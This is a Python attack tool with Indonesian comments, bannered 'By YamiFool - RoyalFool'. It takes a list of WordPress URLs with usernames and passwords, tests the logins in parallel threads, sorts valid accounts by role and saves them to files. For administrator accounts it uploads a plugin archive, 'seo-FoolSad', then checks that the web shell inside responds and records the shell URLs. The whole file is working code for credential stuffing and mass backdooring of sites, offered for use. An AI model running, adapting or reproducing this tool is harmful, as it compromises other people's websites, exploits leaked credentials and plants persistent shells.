import requests
import time
import re
import os
import sys
from urllib.parse import urljoin
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup

def verify_shell(url):
    try:
        resp = requests.get(url, timeout=10)
        # Cek berbagai indikator shell
        indicators = ["RoyalFool", "Priv8 Uploader", "<form", "Upload", "FoolSad", "shell", "System", "command"]
        if any(x in resp.text for x in indicators):
            return True
        return False
    except Exception as e:
        return False

def upload_plugin(session, site, file_path, output_shell):
    try:
        # Perbaiki URL formatting
        site_base = site.replace('/wp-login.php', '').rstrip('/')
        form_url = site_base + '/wp-admin/plugin-install.php?tab=upload'
        post_url = site_base + '/wp-admin/update.php?action=upload-plugin'
        
        # Path plugin Anda yang spesifik
        plugin_path = "wp-content/plugins/seo-FoolSad/FoolSad.php"
        plugin_folder = "seo-FoolSad"  # Nama folder plugin

        # Tambahkan headers untuk menghindari blocking
        session.headers.update({
            'Referer': form_url,
            'Origin': site_base,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        # Ambil halaman upload plugin
        resp = session.get(form_url, timeout=10)
        if resp.status_code != 200:
            print(f"    [DEBUG] Failed to access form page: {resp.status_code}")
            return False

        # Parse nonce
        soup = BeautifulSoup(resp.text, 'html.parser')
        nonce = None
        
        # Coba cari di input field
        nonce_field = soup.find("input", {"name": "_wpnonce"})
        if nonce_field:
            nonce = nonce_field.get("value")
        else:
            # Coba cari di URL
            script_tags = soup.find_all("script")
            for script in script_tags:
                if script.string and 'nonce' in script.string:
                    match = re.search(r'nonce["\']?\s*:\s*["\']([a-f0-9]+)["\']', script.string)
                    if match:
                        nonce = match.group(1)
                        break
        
        if not nonce:
            print(f"    [DEBUG] Could not find nonce")
            return False

        # Pastikan file exists
        if not os.path.exists(file_path):
            print(f"    [ERROR] Plugin file {file_path} not found!")
            return False

        # Baca file zip
        with open(file_path, 'rb') as f:
            file_content = f.read()

        original_filename = os.path.basename(file_path)
        
        # Data untuk upload
        files = {
            'pluginzip': (original_filename, file_content, 'application/zip'),
        }
        data = {
            '_wpnonce': nonce,
            '_wp_http_referer': '/wp-admin/plugin-install.php?tab=upload',
            'install-plugin-submit': 'Install Now'
        }

        # Lakukan upload
        print(f"    [INFO] Uploading plugin to {site_base}...")
        response = session.post(post_url, files=files, data=data, timeout=30, allow_redirects=True)

        # Cek berbagai indikator sukses
        response_text = response.text.lower()
        success_indicators = [
            "successfully", "berhasil", "plugin installed", "already exists",
            "installed", "completed", "uploaded", "aktif", "existing"
        ]
        
        if any(indicator in response_text for indicator in success_indicators) or response.status_code == 200:
            print(f"    [INFO] Plugin upload process completed, verifying shell...")
            
            # Cek path spesifik plugin Anda
            full_url = urljoin(site_base + '/', plugin_path)
            print(f"    [INFO] Cek Shelllu cuyy: {full_url}")
            
            # Tunggu sebentar biar file ter-extract
            time.sleep(3)
            
            # Verifikasi shell
            if verify_shell(full_url):
                print(f"\033[92m    [SUCCESS] Shell uploaded and active at {full_url}\033[0m")
                with open(output_shell, 'a', encoding='utf-8') as f:
                    f.write(f"{full_url}\n")
                    f.write(f"Login: {site_base} | Plugin: seo-FoolSad\n")
                    f.write("-" * 30 + "\n")
                return True
            else:
                # Coba cek apakah folder plugin ada
                folder_url = urljoin(site_base + '/', f"wp-content/plugins/{plugin_folder}/")
                try:
                    folder_check = session.get(folder_url, timeout=5)
                    if folder_check.status_code == 200:
                        print(f"\033[93m    [WARNING] Folder plugin exists but shell not verified at {full_url}\033[0m")
                        print(f"    [INFO] Possible shell locations:")
                        print(f"    - {full_url}")
                        print(f"    - {site_base}/wp-content/plugins/{plugin_folder}/install.php")
                        print(f"    - {site_base}/wp-content/plugins/{plugin_folder}/shell.php")
                        
                        with open(output_shell, 'a', encoding='utf-8') as f:
                            f.write(f"Plugin folder exists: {site_base}/wp-content/plugins/{plugin_folder}/\n")
                            f.write(f"Try: {full_url}\n")
                            f.write("-" * 30 + "\n")
                    else:
                        print(f"\033[91m    [FAILED] Shell not found and folder not accessible\033[0m")
                except:
                    print(f"\033[91m    [FAILED] Could not verify shell\033[0m")
                
                return False
        else:
            print(f"\033[91m    [FAILED] Could not upload plugin to {site_base}\033[0m")
            if "already exists" in response_text:
                print(f"    [INFO] Plugin might already exist, checking shell...")
                # Cek langsung kalau mungkin sudah ada
                full_url = urljoin(site_base + '/', plugin_path)
                if verify_shell(full_url):
                    print(f"\033[92m    [SUCCESS] Shell already exists at {full_url}\033[0m")
                    with open(output_shell, 'a', encoding='utf-8') as f:
                        f.write(f"{full_url} (already existed)\n")
                    return True
            return False
            
    except Exception as e:
        print(f"\033[91m    [ERROR] Exception during upload to {site}: {str(e)}\033[0m")
        return False

class WordPressLoginTester:
    def __init__(self, threads=5, output_admin="admin.txt", output_user="user.txt", 
                 output_other="others.txt", output_shell="shell_uploaded.txt", plugin_zip="seo-FoolSad.zip"):
        self.threads = threads
        self.output_admin = output_admin
        self.output_user = output_user
        self.output_other = output_other
        self.output_shell = output_shell
        self.plugin_zip = plugin_zip
        self.success_count = 0
        self.total_count = 0
        self.valid_credentials = []  # Simpan credential valid
        
    def parse_line(self, line):
        line = line.strip()
        if not line or line.startswith('#'):
            return None
        
        # Support berbagai format
        patterns = [
            r'^(https?://[^\s]+/wp-login\.php)[:\s]+([^:\s]+)[:\s]+(.+)$',
            r'^(https?://[^\s]+)[:\s]+([^:\s]+)[:\s]+(.+)$',
            r'^([^\s]+/wp-login\.php)[:\s]+([^:\s]+)[:\s]+(.+)$',
            r'^([^\s]+)[:\s]+([^:\s]+)[:\s]+(.+)$',
            r'^(https?://[^\s]+)\s+([^\s]+)\s+(.+)$',  # Format dengan spasi
        ]
        
        for pattern in patterns:
            match = re.match(pattern, line)
            if match:
                url = match.group(1)
                username = match.group(2)
                password = match.group(3)
                
                # Fix URL
                if not url.startswith(('http://', 'https://')):
                    url = 'https://' + url
                
                # Pastikan ada wp-login.php
                if '/wp-login.php' not in url and 'wp-admin' not in url:
                    url = url.rstrip('/') + '/wp-login.php'
                elif 'wp-admin' in url and 'wp-login.php' not in url:
                    url = url.replace('wp-admin', 'wp-login.php')
                
                return (url, username.strip(), password.strip())
        
        return None
    
    def read_file(self, filename):
        data = []
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    parsed = self.parse_line(line)
                    if parsed:
                        data.append(parsed)
        except FileNotFoundError:
            print(f"\033[91m    [ERROR] File {filename} not found!\033[0m")
            sys.exit(1)
        return data
    
    def detect_user_role(self, session, base_url):
        try:
            # Extract base site URL
            site_url = base_url.replace('/wp-login.php', '').rstrip('/')
            
            # Coba akses berbagai halaman admin
            admin_url = site_url + '/wp-admin/'
            plugins_url = site_url + '/wp-admin/plugins.php'
            users_url = site_url + '/wp-admin/users.php'
            options_url = site_url + '/wp-admin/options-general.php'
            profile_url = site_url + '/wp-admin/profile.php'
            
            # Cek akses ke plugins.php (indikasi admin)
            try:
                resp = session.get(plugins_url, timeout=5, allow_redirects=False)
                if resp.status_code == 200 and 'plugin-install.php' in resp.text:
                    return "Administrator"
            except:
                pass
            
            # Cek akses ke users.php
            try:
                resp = session.get(users_url, timeout=5, allow_redirects=False)
                if resp.status_code == 200 and 'user-new.php' in resp.text:
                    return "Administrator"
            except:
                pass
            
            # Cek dashboard
            try:
                resp = session.get(admin_url, timeout=5)
                if resp.status_code == 200:
                    html = resp.text.lower()
                    if 'dashboard' in html:
                        # Cek menu yang tersedia
                        if 'plugins.php' in html or 'users.php' in html:
                            return "Administrator"
                        elif 'tools.php' in html:
                            return "Editor"
                        elif 'themes.php' in html:
                            return "Author"
                        else:
                            return "Subscriber"
            except:
                pass
            
            return "User"
            
        except Exception as e:
            return "Unknown"
    
    def check_login(self, url, username, password):
        self.total_count += 1
        
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        try:
            # Get login page first
            response = session.get(url, timeout=15, allow_redirects=True)
            
            if response.status_code in [301, 302, 303, 307, 308]:
                return "REDIRECT", None, url, username, password
            
            # Extract redirect_to dari form jika ada
            redirect_to = url.replace('wp-login.php', 'wp-admin/')
            soup = BeautifulSoup(response.text, 'html.parser')
            redirect_input = soup.find('input', {'name': 'redirect_to'})
            if redirect_input and redirect_input.get('value'):
                redirect_to = redirect_input.get('value')
            
            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': redirect_to,
                'testcookie': '1'
            }
            
            # Add any additional fields from the form
            for form in soup.find_all('form'):
                for input_tag in form.find_all('input'):
                    if input_tag.get('name') and input_tag.get('name') not in login_data:
                        if input_tag.get('name') not in ['log', 'pwd', 'wp-submit', 'redirect_to', 'testcookie']:
                            login_data[input_tag.get('name')] = input_tag.get('value', '')
            
            # Perform login
            response = session.post(url, data=login_data, timeout=15, allow_redirects=True)
            
            # Check if login successful
            if 'wp-admin' in response.url or 'dashboard' in response.text.lower() or 'wp-admin' in response.text.lower():
                if 'login_error' not in response.text and 'incorrect' not in response.text.lower():
                    role = self.detect_user_role(session, url)
                    
                    # Store valid credential
                    site_url = url.replace('/wp-login.php', '').rstrip('/')
                    self.valid_credentials.append({
                        'url': site_url,
                        'username': username,
                        'password': password,
                        'role': role,
                        'session': session  # Simpan session untuk upload nanti
                    })
                    
                    return "VALID", role, url, username, password
                else:
                    return "INVALID", None, url, username, password
            elif 'login_error' in response.text or 'incorrect' in response.text.lower():
                return "INVALID", None, url, username, password
            else:
                return "ERROR", None, url, username, password
                
        except requests.exceptions.Timeout:
            return "ERROR", None, url, username, password
        except requests.exceptions.ConnectionError:
            return "ERROR", None, url, username, password
        except Exception as e:
            return "ERROR", None, url, username, password
    
    def save_result(self, result_type, role, url, username, password):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if result_type == "VALID":
            # Tentukan file output berdasarkan role
            if role == "Administrator":
                out_file = self.output_admin
            elif role in ["Editor", "Author", "Subscriber"]:
                out_file = self.output_other
            else:
                out_file = self.output_user

            # Simpan ke file
            with open(out_file, 'a', encoding='utf-8') as f:
                f.write(f"URL: {url}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Password: {password}\n")
                f.write(f"Role: {role}\n")
                f.write(f"Time: {timestamp}\n")
                f.write("-" * 50 + "\n")
            
            self.success_count += 1
            
            # Tampilkan dengan warna berbeda
            if role == "Administrator":
                print(f"\033[91m[ ADMIN ] {url} | {username}:{password} | Role: {role}\033[0m")
            else:
                print(f"\033[92m[ VALID ] {url} | {username}:{password} | Role: {role}\033[0m")
        
        elif result_type == "INVALID":
            print(f"\033[90m[ INVALID ] {url} | {username}:{password}\033[0m")
        
        elif result_type == "REDIRECT":
            print(f"\033[94m[ REDIRECT ] {url} | {username}:{password}\033[0m")
        
        elif result_type == "ERROR":
            print(f"\033[93m[ ERROR ] {url} | {username}:{password}\033[0m")
    
    def upload_to_admins(self):
        """Upload plugin ke semua admin yang valid"""
        print("\n\033[96m" + "="*60 + "\033[0m")
        print("\033[93m[*] Starting plugin upload to all administrators...\033[0m")
        print("\033[96m" + "="*60 + "\033[0m\n")
        
        admin_list = [c for c in self.valid_credentials if c['role'] == "Administrator"]
        admin_count = len(admin_list)
        
        if admin_count == 0:
            print("\033[93m[!] No administrators found to upload plugin\033[0m")
            return
        
        print(f"\033[92m[+] Found {admin_count} administrators\033[0m\n")
        
        for i, cred in enumerate(admin_list, 1):
            print(f"\033[93m[UPLOADING] ({i}/{admin_count}) To {cred['url']}\033[0m")
            
            if os.path.exists(self.plugin_zip):
                # Gunakan session yang sama dari login
                success = upload_plugin(cred['session'], cred['url'] + '/wp-login.php', self.plugin_zip, self.output_shell)
                if success:
                    print(f"\033[92m    [✓] Upload successful to {cred['url']}\033[0m")
                else:
                    print(f"\033[91m    [✗] Upload failed to {cred['url']}\033[0m")
            else:
                print(f"\033[91m    [ERROR] Plugin file '{self.plugin_zip}' tidak ditemukan!\033[0m")
                print(f"    Current directory: {os.getcwd()}")
                print(f"    Files in directory: {os.listdir('.')}")
                break
            
            # Jeda antar upload
            if i < admin_count:
                time.sleep(3)
    
    def run_tests(self, credentials):
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_cred = {
                executor.submit(self.check_login, url, user, pwd): (url, user, pwd)
                for url, user, pwd in credentials
            }
            
            for future in as_completed(future_to_cred):
                url, user, pwd = future_to_cred[future]
                try:
                    result_type, role, result_url, result_user, result_pwd = future.result()
                    self.save_result(result_type, role, result_url, result_user, result_pwd)
                except Exception as e:
                    print(f"\033[93m[ ERROR ] {url}:{user}:{pwd} - {str(e)}\033[0m")
        
        # Setelah semua testing selesai, upload plugin ke semua admin
        if self.valid_credentials:
            self.upload_to_admins()

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = """
    ╔══════════════════════════════════════════════════════════╗
    ║     WordPress Login Tester with Auto Plugin Upload       ║
    ║                 By YamiFool - RoyalFool                  ║
    ╚══════════════════════════════════════════════════════════╝
    """
    print("\033[96m" + banner + "\033[0m")
    print("\033[93m" + "="*60 + "\033[0m")

def main():
    print_banner()
    
    # Get input from user
    filename = input("\033[97m[?] Listlu Mana:) (default: list.txt): \033[0m").strip()
    if not filename:
        filename = "list.txt"
    
    threads_input = input("\033[97m[?] Threads (1-20, default: 5): \033[0m").strip()
    try:
        threads = int(threads_input) if threads_input else 5
        threads = max(1, min(20, threads))
    except:
        threads = 5
    
    output_admin = input("\033[97m[?] Output admin file (default: admin.txt): \033[0m").strip()
    if not output_admin:
        output_admin = "admin.txt"

    output_user = input("\033[97m[?] Output user file (default: user.txt): \033[0m").strip()
    if not output_user:
        output_user = "user.txt"

    output_other = input("\033[97m[?] Output other roles file (default: others.txt): \033[0m").strip()
    if not output_other:
        output_other = "others.txt"

    output_shell = input("\033[97m[?] Output shell uploaded file (default: shell.txt): \033[0m").strip()
    if not output_shell:
        output_shell = "shell.txt"
        
    plugin_zip = input("\033[97m[?] Plugin zip file name (default: seo-FoolSad.zip): \033[0m").strip()
    if not plugin_zip:
        plugin_zip = "seo-FoolSad.zip"
    
    print("\033[93m" + "="*60 + "\033[0m")
    
    # Cek apakah file plugin ada
    if not os.path.exists(plugin_zip):
        print(f"\033[91m[!] Warning: Plugin file '{plugin_zip}' not found!\033[0m")
        print(f"\033[93m    Upload feature will be skipped.\033[0m")
        print(f"\033[93m    Current directory: {os.getcwd()}\033[0m")
        cont = input("\033[97m    Continue anyway? (y/n): \033[0m").strip().lower()
        if cont != 'y':
            sys.exit(0)
    
    # Initialize tester
    tester = WordPressLoginTester(
        threads=threads, 
        output_admin=output_admin, 
        output_user=output_user, 
        output_other=output_other, 
        output_shell=output_shell, 
        plugin_zip=plugin_zip
    )
    
    try:
        # Read credentials
        credentials = tester.read_file(filename)
        
        if len(credentials) == 0:
            print(f"\033[91m[!] No valid credentials found in {filename}\033[0m")
            print(f"\033[93m    Make sure each line contains: url username password\033[0m")
            print(f"\033[93m    Example: https://target.com/wp-login.php admin password123\033[0m")
            return
        
        print(f"\n\033[92m[+] Found {len(credentials)} credentials to test\033[0m")
        print(f"\033[92m[+] Using {threads} threads\033[0m")
        print(f"\033[92m[+] Output files: {output_admin}, {output_user}, {output_other}, {output_shell}\033[0m")
        print("\033[93m" + "="*60 + "\033[0m\n")
        
        input("\033[97mPress Enter to start testing...\033[0m")
        print()
        
        start_time = time.time()
        tester.run_tests(credentials)
        end_time = time.time()
        
        print("\n\033[93m" + "="*60 + "\033[0m")
        print(f"\033[92m[+] Testing completed!\033[0m")
        print(f"\033[92m[+] Total tested: {tester.total_count}\033[0m")
        print(f"\033[92m[+] Valid logins: {tester.success_count}\033[0m")
        print(f"\033[92m[+] Time elapsed: {end_time - start_time:.2f} seconds\033[0m")
        print(f"\033[92m[+] Results saved to respective files\033[0m")
        print("\033[93m" + "="*60 + "\033[0m")
        
    except FileNotFoundError:
        print(f"\n\033[91m[!] File '{filename}' not found!\033[0m")
    except KeyboardInterrupt:
        print(f"\n\033[93m[!] Testing interrupted by user\033[0m")
        print(f"\033[92m[+] Partial results saved\033[0m")
    except Exception as e:
        print(f"\n\033[91m[!] Error: {str(e)}\033[0m")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
